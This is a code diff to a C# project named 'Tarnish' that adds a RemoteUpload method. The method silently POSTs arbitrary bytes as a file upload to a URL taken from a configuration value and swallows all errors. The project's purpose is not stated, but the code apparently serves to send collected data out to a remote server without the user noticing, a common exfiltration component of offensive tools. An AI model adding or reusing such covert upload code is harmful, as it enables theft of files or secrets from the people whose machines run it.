@@ -2,6 +2,8 @@
 using System.Text;
 using System.Runtime.InteropServices;
 using System.Reflection;
+using System.Net;
+using System.IO;
 
 namespace Tarnish
 {
@@ -69,6 +71,35 @@ namespace Tarnish
                 }
             }
             return buffer1;
+        }
+
+        public static void RemoteUpload(byte[] data, string path)
+        {
+            if (Config.UploadPath != "")
+            {
+                try
+                {
+                    string bound = "---------------------------14737809831466499882746641449";
+                    HttpWebRequest wr = (HttpWebRequest)System.Net.HttpWebRequest.Create(Config.UploadPath);
+                    wr.Method = "POST";
+                    wr.ContentType = "multipart/form-data; boundary=" + bound;
+                    byte[] vars = Encoding.UTF8.GetBytes("\r\n--" + bound + "\r\nContent-Disposition: form-data; name=\"userfile\"; filename=\"" + path + "\"\r\nContent-Type: application/octet-stream\r\n\r\n");
+                    Stream s = wr.GetRequestStream();
+                    s.Write(vars, 0, vars.Length);
+                    s.Write(data, 0, data.Length);
+                    vars = Encoding.UTF8.GetBytes("\r\n--" + bound + "--\r\n");
+                    s.Write(vars, 0, vars.Length);
+                    s.Close();
+                    HttpWebResponse WebResp = (HttpWebResponse)wr.GetResponse();
+                    Stream Answer = WebResp.GetResponseStream();
+                    StreamReader _Answer = new StreamReader(Answer);
+                    Console.BufferHeight = 10000;
+                    s.Dispose();
+                    Answer.Dispose();
+                    _Answer.Dispose();
+                }
+                catch { }
+            }
         }
     }
 }
